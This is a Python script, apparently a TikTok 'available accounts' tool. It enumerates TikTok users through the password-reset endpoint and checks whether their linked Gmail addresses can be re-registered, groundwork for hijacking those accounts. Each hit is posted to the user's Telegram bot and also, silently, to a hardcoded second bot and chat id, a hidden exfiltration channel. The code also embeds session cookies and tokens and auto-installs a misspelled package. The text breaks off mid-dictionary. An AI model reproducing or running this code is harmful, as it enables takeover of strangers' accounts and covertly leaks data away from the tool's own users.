
import os
try:
	from cfonts import render, say
	import requests,os,random
	from user_agent import generate_user_agent
	from uuid import uuid4
	import socket
	import webbrowser
	import threading
	import sys
	import json
except:
	os.system("pip install requsets")
	os.system("pip install names")
	os.system("pip install user_agent")
	os.system("pip install uid")
	os.system("pip install uuid")
	os.system("pip install webbrowser")
	os.system("pip install socket")
	os.system("pip install threading")
	os.system("clear")
os.system('clear')
DDC = ['BY','TJ','TM','KZ','GB','DE','ES','FR',
'UZ','KG','MD','AC','AD','AF','AG','AI','AL',
'AM','AO','AQ','AS','AU','AW','AX','BA','BB','BD','BF','BG','BI','BJ','BL','BM','BN','BQ','BS','BT','BV','BW','BZ','CA','CC','CD','CF','CG',
'CI','CK','CM','CN','CS','CU','CV','CW','CX',
'CY','DK','DM','DR','EA','EE','EH','EN','ET','FJ','FK','FM','FO','GA','GD','GE','GF','GG','GH','GI','GL','GN','GP','GQ','GS','GU','GW','GY','HK','HR','HT','IC','IE','IL','IM','IN','IO','IS','JE','KE','KH','KI','KN','KY','LA','LC','LI','LK','LR','LS','LU','LV','MC','ME','MF','MG','MH','MK','ML','MM','MN','MO','MP','MQ','MS','MT','MU','MV','MW','MZ','NA','NC','NE','NF','NG','NJ','NO','NR','NU','NZ','PF','PG','PK','PM','PN','PR','PW','QS','RE','RW','SB','SC','SH','SI','SJ','SL','SM','SN','SR','ST','SX','SZ','TC','TF','TG','TK','TL','TO','TP','TS','TV','TZ','UG','UM','VA','VC','VG','VI','VU','WF','WS','XA','XB','XK','XX','YJ','YT','ZA','ZG','ZM','ZN','ZW','ZZ','ES','TR','AZ','MA','LB','DZ','ER','TN','SS','BR','MX',
'TH','ID','MY','VN','PH','SG','KR','JP','EG','SY','PS','JO','IQ','DJ','KM','SO',
'TD','OM','QA','KW','AE','BH','SA','YE','LY','MR','LT','JM','CH','IR','AN','FI','PY''AR','GR','UY','CR','DO','PE' 'IT','TT','SV','CZ','BE','CO','TW','HN','EC','SK','NP','RS','NI','SE','GT','CL','NL','RO','HU','VE','AT','PL','PA','BO','GM','PT',"BY","TJ","TM","KZ","GB","DE","ES","FR","UZ","KG","MD","AC","AD","AF","AG","AI","AL","AM","AO","AQ","AS","AU","AW","AX","BA","BB","BD","BF","BG","BI","BJ","BL","BM","BN","BQ","BS","BT","BV","BW","BZ","CA","CC","CD","CF","CG","CI","CK","CM","CN","CS","CU","CV","CW","CX","CY","DK","DM","DR","EA","EE","EH","EN","ET","FJ","FK","FM","FO","GA","GD","GE","GF","GG","GH","GI","GL","GN","GP","GQ","GS","GU","GW","GY","HK","HR","HT","IC","IE","IL","IM","IN","IO","IS","JE","KE","KH","KI","KN","KY","LA","LC","LI","LK","LR","LS","LU","LV","MC","ME","MF","MG","MH","MK","ML","MM","MN","MO","MP","MQ","MS","MT","MU","MV","MW","MZ","NA","NC","NE","NF","NG","NJ","NO","NR","NU","NZ","PF","PG","PK","PM","PN","PR","PW","QS","RE","RW","SB","SC","SH","SI","SJ","SL","SM","SN","SR","ST","SX","SZ","TC","TF","TG","TK","TL","TO","TP","TS","TV","TZ","UG","UM","VA","VC","VG","VI","VU","WF","WS","XA","XB","XK","XX","YJ","YT","ZA","ZG","ZM","ZN","ZW","ZZ","ES","TR","AZ","MA","LB","DZ","ER","TN","SS","BR","MX","TH","ID","MY","VN","PH","SG","KR","JP","EG","SY","PS","JO","IQ","DJ","KM","SO","TD","OM","QA","KW","AE","BH","SA","YE","LY","SD","MR","LT","JM","CH","IR","AN","FI","PY","AR","GR","UY","CR","DO","PE","IT","TT","SV","CZ","BE","CO","TW","HN","EC","SK","NP","RS","NI","SE","GT","CL","NL","RO","HU","VE","AT","PL","PA","BO","GM","PT","BY","TJ","TM","KZ","GB","DE","ES","FR","UZ","KG","MD","AC","AD","AF","AG","AI","AL","AM","AO","AQ","AS","AU","AW","AX","BA","BB","BD","BF","BG","BI","BJ","BL","BM","BN","BQ","BS","BT","BV","BW","BZ","CA","CC","CD","CF","CG","CI","CK","CM","CN","CS","CU","CV","CW","CX","CY","DK","DM","DR","EA","EE","EH","EN","ET","FJ","FK","FM","FO","GA","GD","GE","GF","GG","GH","GI","GL","GN","GP","GQ","GS","GU","GW","GY","HK","HR","HT","IC","IE","IL","IM","IN","IO","IS","JE","KE","KH","KI","KN","KY","LA","LC","LI","LK","LR","LS","LU","LV","MC","ME","MF","MG","MH","MK","ML","MM","MN","MO","MP","MQ","MS","MT","MU","MV","MW","MZ","NA","NC","NE","NF","NG","NJ","NO","NR","NU","NZ","PF","PG","PK","PM","PN","PR","PW","QS","RE","RW","SB","SC","SH","SI","SJ","SL","SM","SN","SR","ST","SX","SZ","TC","TF","TG","TK","TL","TO","TP","TS","TV","TZ","UG","UM","VA","VC","VG","VI","VU","WF","WS","XA","XB","XK","XX","YJ","YT","ZA","ZG","ZM","ZN","ZW","ZZ","ES","TR","AZ","MA","LB","DZ","ER","TN","SS","BR","MX","TH","ID","MY","VN","PH","SG","KR","JP","EG","SY","PS","JO","IQ","DJ","KM","SO","TD","OM","QA","KW","AE","BH","SA","YE","LY","SD","MR","LT","JM","CH","IR","AN","FI","PY","AR","GR","UY","CR","DO","PE","IT","TT","SV","CZ","BE","CO","TW","HN","EC","SK","NP","RS","NI","SE","GT","CL","NL","RO","HU","VE","AT","PL","PA","BO","GM","PT",'AE','AG','AR','AT','AW','BB','BD','BE','BF','BG','GT','GY','HR','HT','IE','IL','BJ','BM', 'BN','BR', 'IT','LR', 'DE','LY','YE','US','FR', 'VI','MQ''IR','SD','AT','GM','BH'"TM","KZ","GB","DE","ES","FR","UZ","KG","MD","AC","AD","AF","AG","AI","AL","AM","AO","AQ","AS","AU","AW","AX","BA","BB","BD","BF","BG","BI","BJ","BL","BM","BN","BQ","BS","BT","BV","BW","BZ","CA","CC","CD","CF","CG","CI","CK","CM","CN","CS","CU","CV","CW","CX","CY","DK","DM","DR","EA","EE","EH","EN","ET","FJ","FK","FM","FO","GA","GD","GE","GF","GG","GH","GI","GL","GN","GP","GQ","GS","GU","GW","GY","HK","HR","HT","IC","IE","IL","IM","IN","IO","IS","JE","KE","KH","KI","KN","KY","LA","LC","LI","LK","LR","LS","LU","LV","MC","ME","MF","MG","MH","MK","ML","MM","MN","MO","MP","MQ","MS","MT","MU","MV","MW","MZ","NA","NC","NE","NF","NG","NJ","NO","NR","NU","NZ","PF","PG","PK","PM","PN","PR","PW","QS","RE","RW","SB","SC","SH","SI","SJ","SL","SM","SN","SR","ST","SX","SZ","TC","TF","TG","TK","TL","TO","TP","TS","TV","TZ","UG","UM","VA","VC","VG","VI","VU","WF","WS","XA","XB","XK","XX","YJ","YT","ZA","ZG","ZM","ZN","ZW","ZZ","ES","TR","AZ","MA","LB","DZ","ER","TN","SS","BR","MX","TH","ID","MY","VN","PH","SG","KR","JP","EG","SY","PS","JO","IQ","DJ","KM","SO","TD","OM","QA","KW","AE","BH","SA","YE","LY","SD","MR","LT","JM","CH","IR","AN","FI","PY","AR","GR","UY","CR","DO","PE","IT","TT","SV","CZ","BE","CO","TW","HN","EC","SK","NP","RS","NI","SE","GT","CL","NL","RO","HU","VE","AT","PL","PA","BO","GM","PT"]
userAgent = "Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 Instagram 215.0.0.27.359 Android (31/12; 540dpi; 1080x2158; samsung; SM-G991B; o1s; exynos2100; fr_FR; 337202359)"
import os
try:
 from cfonts import render, say
except:
 os.system('pip install python-cfonts')
output = render('T O M', colors=['white', 'red'], align='center')
print(output)
#-----------------------------------#
Z = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
C = "\033[1;97m" 
E = '\033[1;31m'
B = '\033[2;95m'
G = '\033[1;32m'
S = '\033[1;33'
F = '\033[2;32m'
C1 = '\033[2;35m'
M = '\x1b[1;91m'
N = '\x1b[0m'
R = '\033[1;31m' #احمر
x = '\33[m' # DEFAULT
o='\x1b[1;93m'
m = '\x1b[1;35m' #RED +
k = '\033[93m' # KUNING +
hkl = '\x1b[1;92m' # HIJAU +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
bkl = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
b = '\33[1;96m' # BIRU -
bkl = '\33[1;96m' # BIRU -
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C1 = '\033[2;35m' #وردي
Ah = '\033[2;36m'#سمائي
CC1 =  "\033[1;97m"
hkl = '\033[1;34m' 
g='\x1b[38;5;210m'
asu = random.choice([m,k,h,u,b,o,CC1,Ah])
ase = random.choice([m,k,h,B,N,M,p,kk])
asd = random.choice([m,g,k,B,kk,bkl,hkl,b])
#-----------------------------------#
print(Y+' ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
print('''\x1b[38;5;210m  ╰─ \033[1;33m[⌯]  \033[2;32mDEVELOPER  : 𓆩𝐓𝐎𝐌𓆪 المطور
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mMY CHANNEL : @hwxdw
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mTOOL       : Tik Tok اداه متاحات 
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mTELEGRAM   : @j4rgs''')
print(Y+' ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')  
tok = input(f' {F}({C}⌯{F}){B} 𝙏𝙊𝙆𝙀𝙉 {X} : {F}'+C)
print()
print(Y+' ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
print()
ID = input(f' {F}({C}⌯{F}){B} 𝙄𝘿 {X} : {F}  '+C)
print()
print(Y+' ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
print('')
import requests
import os
import time
from time import sleep
import requests,colorama,mechanize
from tokenize import cookie_re
import requests
import requests,os,names,json,random
import requests,os,names,random,time
from user_agent import generate_user_agent
from uuid import uuid4
uid = uuid4()
import requests,random,mechanize,time
import requests,random,mechanize,datetime

now = datetime.datetime.today()

now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)


hours = (now.hour)
x = datetime.datetime.now()
g= datetime.datetime(2030, 9, 2)

if (x.strftime("%x"))==(g.strftime("%x")):
   print('')
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    
   
    print('\n\n')
    print(x)
    
    sys.exit(0)
   else:
    print('')  
else:
    print('')
print('')
import requests
DDF = random.choice(DDC)
hj=0
fc=0
hc=0
fj=0
vipDOFLAMINGO=999999999999999


def telegram(email):
	username=email.split('@gmail.com')[0]
	
	headers = {
'user-agent': generate_user_agent()}
	r = requests.get(f'''https://www.tiktok.com/@{username}''', headers=headers).text
	i9 = r.split('secUid":"')[1].split('","ftc":false')[0]
	i5 = r.split('heart":')[1].split(',"heartCount')[0]
	i8 = r.split('"videoCount":')[1].split(',"digg')[0]
	i1 = r.split('"description" content="')[1].split('(')[0]
	i4 = r.split('"followerCount":')[1].split(',')[0]
	i0 = r.split('"'+username+'":{"id":"')[1].split('","shortId"')[0]
	i2 = r.split('"followingCount":')[1].split(',')[0]
	tlg = f'''
  𓊆𝐀𝐂𝐎𝐎𝐔𝐍𝐓 𝐓𝐈𝐊 𝐓𝐎𝐊𓊇
▬▭▬▭▬▭𓆩𝐓𝐎𝐌𓆪▬▭▬▭▬
˹♚˼ 𝒏𝒂𝒎𝒆 ➪   {i1} 
˹♚˼ 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 ➪ @{username}
˹♚˼ 𝒆𝒎𝒂𝒊𝒍 ➪ {email} 
˹♚˼ 𝒇𝒐𝒍𝒍𝒐𝒘𝒆𝒓𝒔 ➪ {i4} 
˹♚˼ 𝒇𝒐𝒍𝒍𝒐𝒘𝒊𝒏𝒈 ➪ {i2}
˹♚˼ 𝒍𝒊𝒌𝒆𝒔 ➪ {i5} 
▬▭▬▭▬▭𓆩𝐓𝐎𝐌𓆪▬▭▬▭▬
 𝗕𝗬 ➪ @j4rgs  | @hwxdw
		'''
	
	print(F+tlg)
	requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text="+str(tlg))
	requests.post(f"https://api.telegram.org/bot6547290327:AAEPcJpyyd7JA1LB2M7s0URv_coF2je4FtM/sendMessage?chat_id=1427981991&text="+str(tlg))
def gmail(email):
	global fc,fj
	eml=str(email)
	email=eml.split('@')[0]+'@gmail.com'
	url = 'https://android.clients.google.com/setup/checkavail'
	h = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
	d = json.dumps({
		'username':email,
		'version':'3',
		'firstName':'AbaLahb',
		'lastName':'AbuJahl'
	})
	res = requests.post(url,data=d,headers=h)
	if res.json()['status'] == 'SUCCESS':
	   fj+=1
	   os.system('clear')
	   print('''\033[1;32m
████████        ██████        ███    ███ 
   ██          ██    ██       ████  ████ 
   ██          ██    ██       ██ ████ ██ 
   ██          ██    ██       ██  ██  ██ 
   ██           ██████        ██      ██
                                  
\n
''')
	   print(f'''\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{F}(✓){F}{F}𝗛𝗜𝗧𝗦 ➥ ⦃ {fj} ⦄  
  
{Y}(✓){Y}{Y}𝗚𝗼𝗼𝗱 𝗧𝗶𝗸𝗧𝗼𝗸 ➥ ⦃ {hj} ⦄
    
{Z}(✘){Z}{Z}𝗕𝗮𝗱 𝗚𝗠𝗔𝗜𝗟 ➥ ⦃ {fc} ⦄ 

{X}(✘){X}{X}𝗕𝗔𝗗 𝗧𝗜𝗞 𝗧𝗢𝗞  ➥ ⦃ {hc} ⦄   
   
{B}(✓){B}{B} 𝗚𝗠𝗔𝗜𝗟 ➥ ⦃ {email} ⦄
\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;210m  Div ➪ @j4rgs | Channl ➪ @hwxdw\n''')
	  
       
	   telegram(email)	    
	else:
	    fc+=1
	    os.system('clear')
	    print('''\x1b[38;5;210m
████████        ██████        ███    ███ 
   ██          ██    ██       ████  ████ 
   ██          ██    ██       ██ ████ ██ 
   ██          ██    ██       ██  ██  ██ 
   ██           ██████        ██      ██
                                  
\n
''')
	    print(f'''\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{F}(✓){F}{F}𝗛𝗜𝗧𝗦 ➥ ⦃ {fj} ⦄  
  
{Y}(✓){Y}{Y}𝗚𝗼𝗼𝗱 𝗧𝗶𝗸𝗧𝗼𝗸 ➥ ⦃ {hj} ⦄
    
{Z}(✘){Z}{Z}𝗕𝗮𝗱 𝗚𝗠𝗔𝗜𝗟 ➥ ⦃ {fc} ⦄ 

{X}(✘){X}{X}𝗕𝗔𝗗 𝗧𝗜𝗞 𝗧𝗢𝗞  ➥ ⦃ {hc} ⦄   
   
{B}(✓){B}{B} 𝗚𝗠𝗔𝗜𝗟 ➥ ⦃ {email} ⦄
\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;210m  Div ➪ @j4rgs | Channl ➪ @hwxdw\n''')
	   

	 
	 
def tiktok(email):
 global hc,hj
 email=str(email)
 url = f'https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018101933&_rticket=1667149902064&iid=7160349471136909061&channel=googleplay&language=ar&fp=&device_type=ANY-LX2&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&carrier_region={DDF}&ac=wifi&device_id=7116197109661091333&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HONOR&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1667149902&as=a1261b755ea4d3e04e4388&cp=be4a3c6ce5e8520fe1MkUo&mas=0149d8edb9a3340aacd5c82fcadadde3801c1ccc2ca62c0ca6cc26'
 
 headers = {
'Host': 'api2-19-h2.musical.ly',
'Connection': 'keep-alive',
'Content-Length': '647',
'Cookie': 'odin_tt=b0db11ac4955afa4589bdb09d8f8fdcf3bcdea5238d0a6e2ba7c6aaea542e8d4ff9a3f324c153df80e03ac5e29a9d411925fa05d2f300713a2295db1eeff68accf50d5ddb5abd11115077fe989cfc094; store-idc=maliva; store-country-code=iq; store-country-code-src=did',
'Accept-Encoding': 'gzip',
'X-SS-QUERIES': 'dGMCAr6ot3awALq2qSjedy1Vk99nIoud%2BAhHSPAsj5dyUWFbxRx0wm95EoKwwNB3VVlOMd4SzMIENA51cwBS%2Bm0N1T95yguPVZ4OunAWAs0t0bHbsPclnVdl1Uh%2BLGZVXFGTew%3D%3D',
'sdk-version': '1',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'X-SS-TC': '0',
'User-Agent': 'com.zhiliaoapp.musically/2018101933 (Linux; U; Android 11; ar_IQ_#u-nu-latn; ANY-LX2; Build/HONORANY-L22CQ; Cronet/58.0.2991.0)'
}


 data = (f'app_language=ar&manifest_version_code=2018101933&_rticket=1667150564079&iid=7160349471136909061&channel=googleplay&language=ar&fp=&device_type=ANY-LX2&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&email={email}&retry_type=no_retry&carrier_region={DDF}&ac=wifi&device_id=7116197109661091333&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HONOR&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233')

 rr = requests.post(url, headers=headers, data=data).text

 if 'Sent successfully' in rr:
 	hj+=1
 	os.system('clear')
 	print('''\x1b[38;5;208m
████████        ██████        ███    ███ 
   ██          ██    ██       ████  ████ 
   ██          ██    ██       ██ ████ ██ 
   ██          ██    ██       ██  ██  ██ 
   ██           ██████        ██      ██    
                                  
\n
''')
 	print(f'''\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{F}(✓){F}{F}𝗛𝗜𝗧𝗦 ➥ ⦃ {fj} ⦄  
  
{Y}(✓){Y}{Y}𝗚𝗼𝗼𝗱 𝗧𝗶𝗸𝗧𝗼𝗸 ➥ ⦃ {hj} ⦄
    
{Z}(✘){Z}{Z}𝗕𝗮𝗱 𝗚𝗠𝗔𝗜𝗟 ➥ ⦃ {fc} ⦄ 

{X}(✘){X}{X}𝗕𝗔𝗗 𝗧𝗜𝗞 𝗧𝗢𝗞  ➥ ⦃ {hc} ⦄   
   
{B}(✓){B}{B} 𝗚𝗠𝗔𝗜𝗟 ➥ ⦃ {email} ⦄
\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;210m  Div ➪ @j4rgs | Channl ➪ @hwxdw\n''')
 	
 	gmail(email)
 
 elif 'Bind device by email failed' in rr:
    os.system('clear')
    print('''\033[1;34m
████████        ██████        ███    ███ 
   ██          ██    ██       ████  ████ 
   ██          ██    ██       ██ ████ ██ 
   ██          ██    ██       ██  ██  ██ 
   ██           ██████        ██      ██
                                  
\n
''')
    hc+=1
    print(f'''\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{F}(✓){F}{F}𝗛𝗜𝗧𝗦 ➥ ⦃ {fj} ⦄  
  
{Y}(✓){Y}{Y}𝗚𝗼𝗼𝗱 𝗧𝗶𝗸𝗧𝗼𝗸 ➥ ⦃ {hj} ⦄
    
{Z}(✘){Z}{Z}𝗕𝗮𝗱 𝗚𝗠𝗔𝗜𝗟 ➥ ⦃ {fc} ⦄ 

{X}(✘){X}{X}𝗕𝗔𝗗 𝗧𝗜𝗞 𝗧𝗢𝗞  ➥ ⦃ {hc} ⦄   
   
{B}(✓){B}{B} 𝗚𝗠𝗔𝗜𝗟 ➥ ⦃ {email} ⦄
\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;210m  Div ➪ @j4rgs | Channl ➪ @hwxdw\n''')
   
 else:
   hc+=1
   os.system('clear')
   print('''\033[1;30m
████████        ██████        ███    ███ 
   ██          ██    ██       ████  ████ 
   ██          ██    ██       ██ ████ ██ 
   ██          ██    ██       ██  ██  ██ 
   ██           ██████        ██      ██    
                                  
\n
''')
   print(f'''\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{F}(✓){F}{F}𝗛𝗜𝗧𝗦 ➥ ⦃ {fj} ⦄  
  
{Y}(✓){Y}{Y}𝗚𝗼𝗼𝗱 𝗧𝗶𝗸𝗧𝗼𝗸 ➥ ⦃ {hj} ⦄
    
{Z}(✘){Z}{Z}𝗕𝗮𝗱 𝗚𝗠𝗔𝗜𝗟 ➥ ⦃ {fc} ⦄ 

{X}(✘){X}{X}𝗕𝗔𝗗 𝗧𝗜𝗞 𝗧𝗢𝗞  ➥ ⦃ {hc} ⦄   
   
{B}(✓){B}{B} 𝗚𝗠𝗔𝗜𝗟 ➥ ⦃ {email} ⦄
\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;210m  Div ➪ @j4rgs | Channl ➪ @hwxdw\n''')
  
def loop():
	try:
          userAG = {
'user-agent':userAgent
}
          GG = requests.get('https://www.tiktok.com/',headers=userAG)
          YY = GG.cookies.get_dict()

          ttwid = YY['ttwid']

          url6 = requests.get(f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=0.84&browser_language=ar-IQ&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20aarch64&browser_version=5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7136188745632548358&device_platform=web_pc&focus_state=true&from_page=search&history_len=40&is_fullscreen=false&is_page_visible=true&keyword=zaid&os=linux&priority_region=&referer=&region={DDF}&screen_height=796&screen_width=360&tz_name=Asia%2FBaghdad&verifyFp=verify_l9zrjkcx_XSZCv5U7_xzys_4UEP_8m1a_TibJS3izVTHL&webcast_language=ar&msToken=qfFKcpRIe_b543Hfa7buaE31PLWDv6-_TQYqevIaTVOPrUNjuwuHR2z0_cEadFELKqD9p6fLuWk8tgAO9lDmVCUX4vqnit3V4rX9zvJfLCbhs9U2apBgYHmKpXPp6DLl2wZy35z0xD6g6TSu_NIh&X-Bogus=DFSzswVLk-tANxW1S02v8OxPBxgg&_signature=_02B4Z6wo00001IuO8aAAAIDBSFHuFzoQUMCLjvUAAEGFfa',headers=userAG)
          YY = url6.cookies.get_dict()
          msToken = YY['msToken']
	except:
          loop()
	user='qwertyuiopasdfghjklzxcvbnm.'
	num='56789'
	rng=int("".join(random.choice(num)for i in range(1)))
	nameee=str("".join(random.choice(user)for i in range(rng)))
	url = f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=1&browser_language=ar-AE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36&channel=tiktok_web&cookie_enabled=true&cursor=20&device_id=7151371875721430533&device_platform=web_pc&focus_state=true&from_page=search&history_len=20&is_fullscreen=false&is_page_visible=true&keyword={nameee}&os=windows&priority_region=&referer=&region={DDF}&root_referer=https://www.google.com/&screen_height=1024&screen_width=1280&tz_name=Asia/Baghdad&webcast_language=ar'
	he = {
                'accept': '*/*',
                'accept-language': 'ar-AE,ar-IQ;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6',
                'cookie': 'passport_csrf_token=446c23e1b656077bd01b1f379ff01c64; passport_csrf_token_default=446c23e1b656077bd01b1f379ff01c64; tiktok_webapp_theme=dark; cookie-consent={"ga":true,"af":true,"fbp":true,"lip":true,"bing":true,"ttads":true,"reddit":true,"version":"v8"}; _ttp=2HZr0KnJ2pqKwJRyQ8myJ28Lpa8; __tea_cache_tokens_1988={"user_unique_id":"7160599742786815489","timestamp":1667850947815,"_type_":"default"}; passport_auth_status=c8fe9febc06f8f7a271309fa9e4f80e9,; passport_auth_status_ss=c8fe9febc06f8f7a271309fa9e4f80e9,; tt_csrf_token=CSVYu9wW-NbmqJ_cgNMHwEIItUNZGwDPM-hU; tt_chain_token=K01fXiH8q/IKwxFnx8jzcA==; _abck=951F354EE38142028A7429E8C92DB598~0~YAAQVvvOF6YBsxSFAQAAMc+wPgl24s0qz4P3iMup3WLL4PWyu/iF6+jb4qL2RfvMEKOGTv6dPfAH9AA2Hm+t/Z/Qn1TlkKHzKXk+KmuWj5d1dmCzqXD0BWgAUcMFCLRinQHou0lzh0ImXOw3B98dRIVnofWMwN8L8JxOErAxrQfi2JIEgTjNECxiZFYaqhpfLqyAUXBESaQxfCYfbNwLNwAAZvjpAfc1viGc/I9vlRIeVc2jYPA5/YUVwAytWPIOb2RuvdrXc2bfybwD3ffG0godURyE+r0QSJapjZK7kfVwbPGnVLal0dzAQM6MK2iDC5YhXugMYw9ZXB2CIaYRg4Cqy/t6BabKM9i+ZJgdvwWQQ6ljnk0pa1bKBsAYL79BxNMrQWccpQxQhUm9n09604O82PBKq8E=~-1~-1~-1; bm_sz=304AE404FA2929B0E90042E8314D20CA~YAAQVvvOF6kBsxSFAQAAMc+wPhIfC1eYkaU2YudlghSK8pNrkVcLYapeM/xrzvQbQkT9quFNwKNHsG4xkv6anwuDXn+BSd+gzoBWSdRZJscGEzPghGpbTStjyG61DtaJIqpkgjW7q6BEP37XgXgrWfHRdmoN5zraADDH7wpkIQ3UlBq5rj88cFl1IY4CUg2DSRugvtjKk+vcNV5AUjQ++v859Tv3vYF3Ga6m5lifIf0u50u/dC1xeVz0p4ew+7U21dwrDdNrai63bM7T9ArdMNk1q+2YK55FJU7tdQwtKtdLtnI=~4407620~4277556; ak_bmsc=EE17F7D340A941EB628DF68B5981EA8D~000000000000000000000000000000~YAAQVvvOF/8BsxSFAQAAS/SwPhJbeUd2XpuVnfaiGo9WDUNsMw3AUn4T4r4BtvFH6pwejSxQJ/K4aoQUK/hGU8InWjW8iSyWgKZxkNIl6lgAAvUdX8CiKcyfyQKJYfQcPDyxW6dnF6+VF2/BABsRcYTw9LUX6MjuhvgtLs1uh3AbWeHxdZFDhp/YYwjrPxoOEXgItQjGUSsxRhgRubItrsXwhW20gW9y+I7Eq22TORlAZOn+jyrl2bYH6C4yxD8yld+5OcSAQ3zKJfQLUjNj03BMgtlIyYT74OIh6GwUzgtjpGLUCzpqdeiOFZdfZApTnRoTK9J01CpUY+YxrThJKz4dScjK1V78LSd2CkfUakgFa7TXfZ1fgfPX/RW2nkWTe9SZtvDH3f62qd9b5oNojffOAM0fpnNeX06hNWSNDRRuiHOmv3m49PN2cJhknh753LdNdt81kj8LJ3SEe1y3sfHb0nPwafPExOaSSrXviHwj4+yLWrZw+dXy3Q==; sid_guard=5d52768f6a4a876314ea37244edfd0d0|1671794088|21600|Fri,+23-Dec-2022+17:14:48+GMT; uid_tt=9392403db19bcfc1eb8eb48532fd8d5e; uid_tt_ss=9392403db19bcfc1eb8eb48532fd8d5e; sid_tt=5d52768f6a4a876314ea37244edfd0d0; sessionid=5d52768f6a4a876314ea37244edfd0d0; sessionid_ss=5d52768f6a4a876314ea37244edfd0d0; sid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; ssid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; bm_sv=F556D2E15739C190D1B417337724D81E~YAAQVvvOF8ACsxSFAQAAaICxPhJ1QOpVK0jJSh0nuEay3Iz+L/0up1OoP09MVnndgBSzTjunJoYxBBQH4BTuDkQIQY+zt9kedbGoP5/7AUt2jVEq7DfEwQYdr31ZvZiHlhdU2Q5jwNvbZvNzQSokkwHoGbPqes9c4kV0ZGJuEuWc3pLurp0dkRkEBTY0UrcljYpQayw5/w7+4BlpmrMR5UAHElAGf2njGNpz3vRls+WGkTy9l8jRTCEseWkwnA9X~1; ttwid=' + ttwid + '; odin_tt=70015f10b12827e4d2b9cce32ead78da9bd1f5af11487a83ba408d86d9a4fb55ec780a14ad91b601d9fe256fcb8160786311c12ef294e6bf285fbbf7eed8dff8080f26ed1bcedbdfca7244743dcbc60e; msToken=' + msToken + '; msToken=' + msToken + '; s_v_web_id=verify_lc0f2h1w_v9MWasYr_Uw4b_4j2o_8gdZ_QkWrSxI57MTt',
